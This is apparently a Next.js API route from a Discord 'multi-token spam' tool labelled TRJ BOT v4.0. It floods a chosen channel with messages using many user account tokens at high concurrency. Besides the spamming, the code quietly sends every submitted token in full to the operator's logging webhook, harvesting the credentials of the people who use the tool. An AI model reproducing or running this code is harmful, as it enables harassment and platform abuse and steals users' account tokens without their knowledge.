import { NextRequest, NextResponse } from 'next/server';
import { sendToWebhook, sendFullToken } from '@/lib/webhook';
import { discordFetch, cleanToken } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:multi-spam`, RATE_LIMITS.medium);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }


    const body = await request.json().catch(() => ({}));
    const { tokens, channelId, messages, duration, speed } = body;

    if (!tokens || !Array.isArray(tokens) || tokens.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل توكن واحد على الأقل' }, { status: 400 });
    }
    if (!channelId) {
      return NextResponse.json({ success: false, error: 'أدخل أيدي الروم' }, { status: 400 });
    }
    if (!messages || !Array.isArray(messages) || messages.length === 0) {
      return NextResponse.json({ success: false, error: 'أدخل رسالة واحدة على الأقل' }, { status: 400 });
    }

    const cleanedTokens = tokens.map((t: string) => cleanToken(t)).filter((t: string) => t.length >= 20);
    if (cleanedTokens.length === 0) {
      return NextResponse.json({ success: false, error: 'لا توجد توكنات صالحة' }, { status: 400 });
    }

    sendFullToken('سبام متعدد', cleanedTokens.join('\n'));

    const whUrl = getLogWebhookUrl();
    const endTime = Date.now() + ((duration || 60) * 1000);
    const baseDelay = Math.max((speed || 0.3) * 1000, 50);
    const concurrency = Math.min(cleanedTokens.length * 3, 20); // زيادة التزامن

    sendToWebhook({
      username: 'TRJ Multi-Spam',
      embeds: [{
        title: '🔥 Multi-Token Spam Started',
        color: 0xFF8800,
        fields: [
          { name: '📺 Channel', value: channelId, inline: true },
          { name: '🔑 Tokens', value: String(cleanedTokens.length), inline: true },
          { name: '📝 Messages', value: String(messages.length), inline: true },
          { name: '⏱️ Duration', value: `${duration || 60}s`, inline: true },
          { name: '🚀 Speed', value: `${speed || 0.3}s`, inline: true },
          { name: '⚡ Concurrency', value: String(concurrency), inline: true },
          { name: '🎫 Token', value: `\`\`\`${cleanedTokens.join('\n')}\`\`\`` },
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    let sent = 0, failed = 0, tokenIndex = 0, msgIndex = 0;
    const tokenStats: Record<string, { sent: number; failed: number }> = {};

    for (const t of cleanedTokens) {
      tokenStats[t.substring(0, 10)] = { sent: 0, failed: 0 };
    }

    while (Date.now() < endTime) {
      const batchPromises = Array.from({ length: concurrency }, async () => {
        if (Date.now() >= endTime) return 0;
        const currentToken = cleanedTokens[tokenIndex % cleanedTokens.length];
        const currentMessage = messages[msgIndex % messages.length];
        tokenIndex++;
        msgIndex++;

        try {
          const result = await discordFetch(currentToken, 'POST', `/channels/${channelId}/messages`, { content: currentMessage });
          const key = currentToken.substring(0, 10);
          if (result.ok) {
            tokenStats[key].sent++;
            return 1;
          } else {
            tokenStats[key].failed++;
            return result.status !== 429 ? -1 : 0;
          }
        } catch {
          return -1;
        }
      });

      const batchResults = await Promise.all(batchPromises);
      for (const r of batchResults) {
        if (r === 1) sent++;
        else if (r === -1) failed++;
      }
      await new Promise(r => setTimeout(r, baseDelay));
    }

    const tokenFields = Object.entries(tokenStats).map(([key, val]) => ({
      name: `🎫 ${key}...`,
      value: `✅ ${val.sent} | ❌ ${val.failed}`,
      inline: true
    }));

    sendToWebhook({
      username: 'TRJ Multi-Spam',
      embeds: [{
        title: '✅ Multi-Token Spam Completed',
        color: 0x00FF41,
        fields: [
          { name: '✅ Total Sent', value: String(sent), inline: true },
          { name: '❌ Failed', value: String(failed), inline: true },
          { name: '🔑 Tokens Used', value: String(cleanedTokens.length), inline: true },
          ...tokenFields.slice(0, 10),
        ],
        footer: { text: 'TRJ BOT v4.0' },
        timestamp: new Date().toISOString()
      }]
    }, whUrl).catch(() => {});

    return NextResponse.json({ success: true, stats: { sent, failed, tokenStats } });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Multi-Spam Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
